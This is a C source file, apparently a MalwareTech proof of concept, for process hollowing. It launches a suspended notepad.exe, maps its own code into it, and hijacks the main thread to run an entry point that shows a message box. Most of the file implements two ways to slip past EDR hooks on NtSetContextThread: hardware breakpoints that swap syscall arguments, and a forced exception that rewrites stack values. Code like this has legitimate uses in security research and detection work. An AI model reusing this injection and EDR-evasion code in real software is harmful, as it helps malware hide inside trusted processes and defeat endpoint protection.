/****************************************************************************************************
	This source is licensed under the MalwareTech Public License which gives you permission to use
	it freely as long as the code is replicated using a Hansen ball typewriter and compiled by hand.
	Just kidding, do whatever you want except write malware with it.
*****************************************************************************************************/

#include <windows.h>
#include <stdio.h>
#include "NtDefs.h"
#include "HardwareBreakpoints.h"
#include "ProcessInjection.h"


t_NtUnmapViewOfSection NtUnmapViewOfSection;
t_NtCreateSection NtCreateSection;
t_NtMapViewOfSection NtMapViewOfSection;
t_NtSetContextThread NtSetContextThread;
t_NtClose NtClose;

int g_bypass_method = 0;
HANDLE g_thread_handle = NULL;
PCONTEXT g_thread_context = NULL;

int RemoteMain();

// dynamically resolve the required ntdll functions
BOOL ResolveNativeApis()
{
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (!ntdll)
		return FALSE;

	NtUnmapViewOfSection = (t_NtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
	if (!NtUnmapViewOfSection)
		return FALSE;

	NtCreateSection = (t_NtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
	if (!NtCreateSection)
		return FALSE;

	NtMapViewOfSection = (t_NtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
	if (!NtMapViewOfSection)
		return FALSE;

	NtSetContextThread = (t_NtSetContextThread)GetProcAddress(ntdll, "NtSetContextThread");
	if (!NtSetContextThread)
		return FALSE;

	NtClose = (t_NtClose)GetProcAddress(ntdll, "NtClose");
	if (!NtClose)
		return FALSE;

	return TRUE;
}

// exception handler for hardware breakpoints
LONG WINAPI BreakpointHandler(PEXCEPTION_POINTERS e)
{
	// hardware breakpoints trigger a single step exception
	if (e->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
		// this exception was caused by DR0 (syscall breakpoint)
		if (e->ContextRecord->Dr6 & 0x1) {
			printf("syscall breakpoint triggered at address: 0x%llx\n",
				   (DWORD64)e->ExceptionRecord->ExceptionAddress);

			// replace the fake parameters with the real ones
			e->ContextRecord->Rcx = (DWORD64)g_thread_handle;
			e->ContextRecord->R10 = (DWORD64)g_thread_handle;
			e->ContextRecord->Rdx = (DWORD64)g_thread_context;
		}

		// this exception was caused by DR1 (syscall ret breakpoint)
		if (e->ContextRecord->Dr6 & 0x2) {
			printf("syscall ret breakpoint triggered at address: 0x%llx\n",
				   (DWORD64)e->ExceptionRecord->ExceptionAddress);

			// set the parameters back to fake ones
			// since x64 uses registers for the first 4 parameters, we don't need to do anything here
			// for calls with more than 4 parameters, we'd need to modify the stack
		}
	}

	e->ContextRecord->EFlags |= (1 << 16); // set the ResumeFlag to continue execution

	return EXCEPTION_CONTINUE_EXECUTION;
}

// exception handler for forced exception
LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS e)
{
	static CONTEXT fake_context = { 0 };

	printf("Exception handler triggered at address: 0x%llx\n", (DWORD64)
		   e->ExceptionRecord->ExceptionAddress);
	
	DWORD64* stack_ptr = (DWORD64*)e->ContextRecord->Rsp;
	
	// iterate first 300 stack variables looking for our fake address
	for (int i = 0; i < 300; i++) {
		if (*stack_ptr == 0x1337) {
			// replace the fake address with the real one
			*stack_ptr = (DWORD64)g_thread_context;

			printf("Fixed stack value at RSP+(0x8*0x%x) (0x%llx): 0x%llx\n", 
				   i, (DWORD64)stack_ptr, (DWORD64)*stack_ptr);
		}
		stack_ptr++;
	}

	// The pointer to our invalid address is in RBX, so replace it with an empty structure
	// the RCX member of the context structure being NULL will cause the EDR to skip its check
	e->ContextRecord->Rbx = (DWORD64)&fake_context;

	return EXCEPTION_CONTINUE_EXECUTION;
}

// a separate thread for calling NtSetContextThread so we can set hardware breakpoints
DWORD SetThreadContextThread(LPVOID param) {

	// call NtSetContextThread with fake parameters (can be anything but we chose NULL)
	NTSTATUS status = NtSetContextThread(NULL, NULL);
	if (!NT_SUCCESS(status)) {
		printf("NtSetContextThread() failed, error: %x\n", status);
		return -1;
	}

	return 0;
}

BOOL BypassHookUsingBreakpoints() {
	// set an exception handler to handle hardware breakpoints
	SetUnhandledExceptionFilter(BreakpointHandler);

	// create a new thread to call SetThreadContext in a suspended state so we can modify its own context
	HANDLE new_thread = CreateThread(NULL, NULL, SetThreadContextThread,
									 NULL, CREATE_SUSPENDED, NULL);
	if (!new_thread) {
		printf("CreateThread() failed, error: %d\n", GetLastError());
		return FALSE;
	}

	// set our hardware breakpoints before and after the syscall in the NtSetContextThread stub
	SetSyscallBreakpoints((LPVOID)NtSetContextThread, new_thread);

	ResumeThread(new_thread);

	// wait until the SetThreadContext thread has finished before continuing
	WaitForSingleObject(new_thread, INFINITE);

	return TRUE;
}

BOOL BypassHookUsingForcedException() {
	// set an exception handler to handle hardware breakpoints
	SetUnhandledExceptionFilter(ExceptionHandler);

	// call SetThreadContext with an invalid address to trigger exception
	if (!SetThreadContext(g_thread_handle, (CONTEXT*)0x1337)) {
		printf("SetThreadContext() failed, error: %d\n", GetLastError());
	}

	return TRUE;
}

// launch a new suspended process, inject our code into it, then hijack the main thread to call our entrypoint
int InjectNewProcess(WCHAR* image_path)
{
	BOOL success = FALSE;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOW si = { 0 };
	LPVOID remote_base_addr = NULL;
	CONTEXT thread_context = { 0 };

	do { // this isn't a loop

		// resolve ntdll functions
		if (!ResolveNativeApis()) {
			printf("Failed to resolve functions from ntdll\n");
			break;
		}

		// create the target process in a suspended state so we can modify its memory and the context of its main thread
		if (!CreateProcessW(NULL, image_path, NULL, NULL,
							FALSE, CREATE_SUSPENDED, NULL, NULL,
							&si, &pi))
		{
			printf("CreateProcessA() Failed with error: %d\n", GetLastError());
			break;
		}

		// inject ourself into the suspended process
		remote_base_addr = InjectProcess(pi.hProcess);
		if (!remote_base_addr) {
			printf("Failed to map our executable into the hollowed process\n");
			break;
		}

		thread_context.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;

		// get the context of the main thread in the new process (used to call its entrypoint)
		if (!GetThreadContext(pi.hThread, &thread_context)) {
			printf("GetThreadContext() Failed with error: %d\n", GetLastError());
			break;
		}

		// new x64 threads start at RtlUserThreadStart with their entrypoint address in the RCX register
		thread_context.Rcx = ((DWORD64)&RemoteMain - (DWORD64)GetModuleHandle(NULL)) + (DWORD64)remote_base_addr;

		// copy the real NtSetContextThread parameters into global variables so we can set them from our exception handler
		g_thread_handle = pi.hThread;
		g_thread_context = &thread_context;

		if (g_bypass_method == 1) {
			printf("Attempting bypass using hardware breakpoints\n");
			BypassHookUsingBreakpoints();
		} else if(g_bypass_method == 2) {
			printf("Attempting bypass using forced exception\n");
			BypassHookUsingForcedException();
		} else {
			printf("invalid g_bypass_method value\n");
			return FALSE;
		}

		// resume the new process' main thread, starting the process
		if (!ResumeThread(pi.hThread)) {
			printf("Failed to unsuspended process, Error: %d\n", GetLastError());
			break;
		}

		printf("{Injection Successful}\n" \
			   "%ws\n" \
			   "Remote Base Address: 0x%xll\n" \
			   "Remote Thread Start: 0x%xll\n" \
			   "Remote Entry Point:  0x%xll\n",
			   image_path,
			   (DWORD64)remote_base_addr,
			   (DWORD64)thread_context.Rip,
			   (DWORD64)thread_context.Rcx);

		success = TRUE;

	} while (FALSE);

	if (success == FALSE && pi.hProcess != NULL)
		TerminateProcess(pi.hProcess, 0);

	if (pi.hProcess != NULL)
		CloseHandle(pi.hProcess);

	if (pi.hThread != NULL)
		CloseHandle(pi.hThread);

	return success;
}

int main() {
	WCHAR image_path[MAX_PATH];

	// bypass method: 1 = hardware breakpoints, 2 = forced exception
	g_bypass_method = 2;

	// find the full path to notepad.exe
	ExpandEnvironmentStringsW(L"%windir%\\system32\\notepad.exe", image_path, MAX_PATH - 1);

	// do process hollowing
	InjectNewProcess(image_path);

	return getchar();
}

// the function we'll use as the entrypoint for the hollowed process
int RemoteMain() {
	MessageBoxA(NULL, "Process Hollowing POC from MalwareTech", "www.malwaretech.com", MB_ICONINFORMATION);
	return 0;
}